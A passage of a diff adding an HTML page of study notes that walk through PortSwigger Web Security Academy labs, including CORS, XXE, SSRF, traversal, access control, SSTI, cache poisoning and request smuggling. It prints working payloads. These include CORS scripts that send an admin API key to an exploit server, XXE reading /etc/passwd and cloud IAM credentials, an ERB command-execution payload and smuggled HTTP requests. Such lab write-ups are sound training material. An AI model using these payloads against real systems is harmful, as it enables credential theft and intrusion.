+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+&lt;/script&gt;
+
+</code></pre>
+<p>replacing the $url with our unique id lab. We store, deliver exploit to victim and click see exploit. We notice the api key of the administrator account is in there, and that is the key to solve the lab.</p>
+<h3 id="cors-lab-2">CORS LAB 2</h3>
+<p>Origin header value can be null, and the server can accept that in the following conditions:</p>
+<pre><code>
+    Origins whose scheme is not one of http, https, ftp, ws, wss, or gopher (including blob, file and data).
+    Cross-origin images and media data, including that in &lt;img&gt;, &lt;video&gt; and &lt;audio&gt; elements.
+    Documents created programmatically using createDocument(), generated from a data: URL, or that do not have a creator browsing context.
+    Redirects across origins.
+    iframes with a sandbox attribute that doesn't contain the value allow-same-origin.
+    Responses that are network errors.
+
+</code></pre>
+<p>So, in our case, we craft a sandboxed iframe payload.</p>
+<pre><code>&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','$url/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+    };
+&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;
+
+</code></pre>
+<p>Replace $url with the unique lab url.</p>
+<p>Replace $exploit-server-url with the unique exploit server url.</p>
+<h2 id="xxe">XXE</h2>
+<p>XML External Entity allows an attacker to interfere with application's processing of XML data. It can alllow to view files, interact with systems the app is able to access. It might be leveraged for SSRF.</p>
+<h3 id="xxe-lab-1">XXE LAB 1</h3>
+<p>It's fairly simple. Whilst checking the stock of a product, the client queries the server with XML. Thus:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+
+</code></pre>
+<h3 id="xxe-lab-2">XXE LAB 2</h3>
+<p>Same logic, but we replace file:// with http://169.254.169.254/latest/meta-data/iam/security-credentials/admin, thus:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+
+</code></pre>
+<h2 id="ssrf-server-side-request-forgery">SSRF - Server Side Request Forgery</h2>
+<p>It happens when the server makes a request to an arbitrary server, which can even be itself. If the server allows it, we can use, for example, the file:/// directive to whatever file we want the server to fetch, and the server should return that in the response, if its not a blind SSRF.</p>
+<h3 id="ssrf-lab-1">SSRF LAB 1</h3>
+<p>The server sends a request to another server to fetch the stock data, as such we only need to replace the server payload with ours:</p>
+<pre><code>http://localhost/admin/delete?username=carlos
+
+</code></pre>
+<h3 id="ssrf-lab-2">SSRF LAB 2</h3>
+<p>We know there's another internal server which is capable of running admin functions, so we brute-force the last octet of the given IP, appending the url path to do the admin action:</p>
+<pre><code>http%3A%2F%2F192.168.0.x%3A8080/admin/delete?username=carlos
+
+</code></pre>
+<h2 id="directory-traversal">Directory Traversal</h2>
+<p>It occurs when a file is programatically opened with the filename being user input. For example, in python, <code>open(userinput)</code> can lead to this.</p>
+<p>An attacker, if the input isn't properly validated, can simply append a payload that traverses through the path, such as: <code>../../../etc/passwd</code>. This allows an attacker to see the etc/passwd file,  because .. in Linux means to go back one directory.</p>
+<h3 id="directory-traversal-lab-1">Directory Traversal LAB 1</h3>
+<p>A filename parameter is used to fetch images, we replace the image name with: </p>
+<p><code>../../../etc/passwd</code> and the password file is show.</p>
+<h2 id="access-control">Access Control</h2>
+<p>Authorization is the process of determining if a given user can perform the requested actions or access resources.</p>
+<p>It can be vertical, horizontal or context dependant.</p>
+<p>Vertical access control mechanisms restrict access to sensitive functionality that is not available to other types of users.</p>
+<p><strong>For example, an administrator might be able to modify or delete any user's account, while an ordinary user has no access to these actions</strong></p>
+<p>Horizontal access control mechanisms restrict access to resources to users who are specifically allowed to access those resources.</p>
+<p><strong>For example, a banking application will allow a user to view transactions and make payments from their own accounts, but not the accounts of any other user</strong> </p>
+<p>Context dependant access control mechanisms restrict access to resources based on a user's interaction with them.</p>
+<p><strong>For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment</strong></p>
+<h3 id="access-control-lab-1">Access Control LAB 1</h3>
+<p>We need to delete a user knowing there is unprotected admin functionality. We go to robots.txt looking for that and find the endpoint: <code>administrative-panel</code>. We go to it and see we can access all admin functions, such as delete user. We delete the user required to complete the lab</p>
+<h3 id="access-control-lab-2">Access Control LAB 2</h3>
+<p>Same logic, but this time exists an admin panel with an unpredictable url generated by js. We open the source code and see the url lying there. Open that url and delete the user required to complete the lab.</p>
+<h3 id="access-control-lab-3">Access Control LAB 3</h3>
+<p>This time a user role is set by the cookie Admin=true|false after logging in. So we log in.</p>
+<p>We need to get admin, so we set the cookie Admin=false to true after logging in.</p>
+<h3 id="access-control-lab-4">Access Control LAB 4</h3>
+<p>We know there's a parameter called roleid which when changed to 2 gives us admin. We open burpsuite, enter the lab and notice we can change our roleid in the profile. We set a valid email. Start intercept, click update email and change the request to include "roleid":2. We forward it and notice we are admin by clicking on the Admin-Panel link that appeared.</p>
+<h3 id="access-control-lab-5">Access Control LAB 5</h3>
+<p>This time, when we log in, we can see the id GET parameter in the url pointing to the current user. Thus, we need only change it to carlos and we are now in carlos's account. Copy his api key and submit it as the solution.</p>
+<h3 id="access-control-lab-5_1">Access Control LAB 5</h3>
+<p>This time, the user-id is unpredictable, nonetheless, we can see it visiting the given user's page. As such, we visit carlos's page and copy the uuid in the get parameter. We login to our account and replace the uuid with carlo's. Copy and paste the api key in the solution.</p>
+<h3 id="access-control-lab-6">Access Control LAB 6</h3>
+<p>The response is a redirect but the backend doesn't remove the body, so we can see the results of our request anyway. We log in, go to my account, send that request to burpsuite repeater, add an ?id=carlos query-string to the url and get the api key. Paste it as the solution.</p>
+<h3 id="access-control-lab-7">Access Control LAB 7</h3>
+<p>We can change the user id to administrator in my account page after logging in. Send that request to burpsuite, look for the administrator password in the source code. Log in as administrator, dele the user carlos.</p>
+<h3 id="access-control-lab-8">Access Control LAB 8</h3>
+<p>We go login to our account, wiener:peter and go to live chat. We send a message and click get transcript. We notice it's getting an endpoint that fetches 2.txt. We change it to 1 and see the password there.</p>
+<h2 id="insecure-deserialization">Insecure deserialization</h2>
+<p>Serialization is the process of converting data structures such as objects into something that can be sent and received like a stream of bytes. Basically you use it to save the object's state.
+Deserialization is the process of restoring this stream of bytes to its original state.
+Insecure deserialization occurs when user input is deserialized.</p>
+<h3 id="insecure-deserialization-lab-1">Insecure deserialization LAB 1</h3>
+<p>We login with account <code>wiener:peter</code>. We open our browser's dev tools. We notice we receive a cookie whose value we decode and notice it is a php serialized object. The <code>admin</code>attribute contains a boolean value set to false. We set it to true by replacing 0 with 1. Encode the cookie. We now have access to the admin panel. Go there and delete user <code>carlos</code>.</p>
+<h2 id="information-disclosure">Information Disclosure.</h2>
+<p>It's the process of discovering sensitive (or not) information that the website unintentionally discloses to the user.</p>
+<h3 id="information-disclosure-lab-1">Information Disclosure LAB 1</h3>
+<p>We click to see any arbitrary product and notice it has an id parameter which expects an int. We providade it an arbitrary string such as: <code>"hello"</code>and notice it spews out information. The apache version is the challenge.</p>
+<h3 id="information-disclosure-lab-2">Information Disclosure LAB 2</h3>
+<p>We open the source-code of the home page and scroll through the comments. We notice one called <code>debug</code>. It points to <code>/cgi-bin/phpinfo.php</code>. We go there and find <code>SECRET_KEY</code>. It is the solution for the lab.</p>
+<h3 id="information-disclosure-lab-3">Information Disclosure LAB 3</h3>
+<p>We browse to a directory called <code>/backup/</code> and it has directory listing set. We click on the only file there. On the source-code, there's a password for a <code>postgres</code> database. It is the solution.</p>
+<h3 id="information-disclosure-lab-4">Information Disclosure LAB 4</h3>
+<p>We browse to <code>/admin</code> and notice we need a local IP to view the panel. We <code>TRACE</code> admin and see the header: <code>X-Custom-IP-Authorization</code>. We set it in our request to <code>/admin</code> with value: <code>127.0.0.1</code> We send a request to the page and open it in our browser and delete user <code>carlos</code>.</p>
+<h2 id="business-logic-vulnerabilities">Business Logic Vulnerabilities</h2>
+<p>Arise when developers assume an end user will interact a certain way but interacts in another, unintended way, leading to unintended behaviour by the web application (so called logic-flaws).</p>
+<h3 id="business-logic-vulnerabilities-lab-1">Business logic vulnerabilities LAB 1</h3>
+<p>This time, the developer assumed a user would only use the browser to make requests, he placed excessive trust in client side controls. This mean we can simply craft a request which changes the <code>price</code>parameter to 1, and we will buy that item for that price.</p>
+<p>Simply open burpsuite, set intercept on. View details on the 1337 l34th3r j4ck3t, click order, change price to 1, go to your cart and order it. The lab is solved.</p>
+<h2 id="server-side-template-injection">Server Side Template Injection</h2>
+<p>Occurs when user input is directly concatenated to the template renderer instead of being passed in as data in the appropriate fields. It leads to server-side RCE.</p>
+<h3 id="ssti-lab-1">SSTi LAB 1</h3>
+<p>We need to pop RCE knowing it's ERB template. The objective is to delete morale.txt. That's fairly simple, call system function.</p>
+<p>Final payload: <code>&lt;%= system('rm morale.txt') %&gt;</code></p>
+<h2 id="web-cache-poisoning">Web Cache Poisoning</h2>
+<p>Between the client and the server lays a cache, it uses keyed input, that is, parts of the http request, to determine if a cached request will be served. The logic is as follows: If the keyed input in the http request matches the keyed input cached, then a cached request is served. Otherwise, it is forwarded to the server.</p>
+<h3 id="web-cache-poisoning-lab-1">Web Cache Poisoning LAB 1</h3>
+<p>We send two GET requests to <code>/?cb=1234</code> and notice the second one's response displays a header: <code>X-Cache: hit</code>, implying the cache served us a response. In order to be served by the cache, we only need to send a request, and the next request (if it has the same keyed input) is served by the cache. The object is to pop an alert via X-Forwarded-Host.</p>
+<p>Add that header with an arbitrary host value, such as example.com, and send the request. Copy the path of the absolute url it generates. Go the exploit serve and change the filename to that, in the body write <code>alert(document.cookie)</code> and store the exploit. Go back to the previous GET request but remove the query-string. Substitute the arbitrary X-Forwareded-Host value to your exploit-lab url. Send the request until the <code>hit</code> displays again. If the lab is not solved, re-send the request every few seconds until it is.</p>
+<h3 id="web-cache-poisoning-lab-2">Web Cache Poisoning LAB 2</h3>
+<p>We need to pop an alert(1) through the cookie. First we add a cache buster such as: <code>?cb=1234</code> and figure out which cookie is being reflected. It's fehost, so we add to it: <code>"-alert(1)-"</code>. We remove the cache buster, therefore sending that request to <code>/</code>. When we get a <code>X-Cache: hit</code> header, copy the url and paste it in the browser. The alert is popped, lab is solved.</p>
+<h2 id="request-smuggling">Request Smuggling</h2>
+<p>Is the process of sending a smuggled request inside another request. This arises when there are multiple servers before reaching the ultimate backend server. Imagine a situation where the frontend server uses Content-Length to discern where the body ends, but the backend server uses Transfer-Encoding:</p>
+<p>The frontend will forward the entire request to the backend, due to the matching content-length, but the backend server will see a chunk size of 0, implying the transfer encoding request is over. However, since the frontend server forwarded the whole request, there are still bytes left unprocessed, which due to the nature of the http protocol, will be seen as the next HTTP request.</p>
+<p>CL-TE:</p>
+<h3 id="lab-1_1">LAB 1</h3>
+<pre><code>
+POST / HTTP/1.1
+Host: 0af7005004fa2008c0e7414d00480036.web-security-academy.net
+Cookie: session=q4YcBH0UA9IiP3stGRgZQhwFCOXFSUBi
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+tRANSFER-ENCODING: chunked
+
+
+0
+
+G
+
+</code></pre>
+<p>TE-CL:</p>
+<h3 id="lab-2_1">LAB 2</h3>
+<p>It's the same logic: Frontend forwards the entire request, backend only see's some of it, the rest is left unprocessed and will be seen as the next HTTP request.
+Front end see's the request until the 0 byte, backend only see's the request until what content-length allows. Solutin:</p>
+<pre><code>
+POST / HTTP/1.1
+Host: 0a3e00eb042b50ccc0fb12c9008d003b.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+0
+
+</code></pre>
+<p>TE-TE:</p>
+<p>Make one of the servers not process the TE header in some way.</p>
+<h3 id="lab-2_2">LAB 2</h3>
+<pre><code>
+POST / HTTP/1.1
+Host: 0a48004d04017b53c0a8806e00fd0057.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+</code></pre>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../../notes/sql/" class="btn btn-neutral float-left" title="SQL - Structured Query Language"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../../quiz/SecurityChampion/" class="btn btn-neutral float-right" title="QUIZ">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../../notes/sql/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../../quiz/SecurityChampion/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script>var base_url = '../..';</script>
+    <script src="../../js/theme_extra.js" defer></script>
+    <script src="../../js/theme.js" defer></script>
+      <script src="../../search/main.js" defer></script>
+    <script defer>
+        window.onload = function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        };
+    </script>
+
+</body>
+</html>
